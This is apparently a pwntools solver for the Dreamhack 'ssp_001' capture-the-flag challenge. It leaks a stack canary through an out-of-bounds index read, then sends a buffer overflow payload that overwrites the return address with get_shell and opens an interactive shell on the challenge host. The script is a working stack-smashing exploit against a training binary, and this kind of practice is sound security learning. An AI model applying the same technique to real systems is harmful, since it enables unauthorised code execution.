from pwn import *

def Solver():
    p = remote("host3.dreamhack.games",port)
    canary = b''
    elf = ELF('./ssp_001')

    get_shell=elf.symbols['get_shell']

    payload=b''
    
    for idx in range(4):       #Leak Canary
        p.sendafter("> ",b"P")
        p.sendlineafter("index : ",str(0x80+idx))
        p.recvuntil("is : ")
        canary = p.recvline()[0:2] + canary
    print("Canary : ", canary)
    print("get_shell : ", hex(get_shell))

    canary = int(canary,16)

    payload += b'A'* 0x40     # Fill name[0x40]
    payload += p32(canary)    # Add leaked canary
    payload += b'B' * 0x08    # Add dummy(0x04) + SFP(0x004)
    payload += p32(get_shell) # Add Address of get_shell
    
    p.sendafter("> ",b"E")
    p.sendlineafter("Size : ",str(len(payload)))
    p.sendafter("Name : ",payload)
    
    p.interactive()

if __name__== "__main__":
    port = sys.argv[1]
 
    Solver()

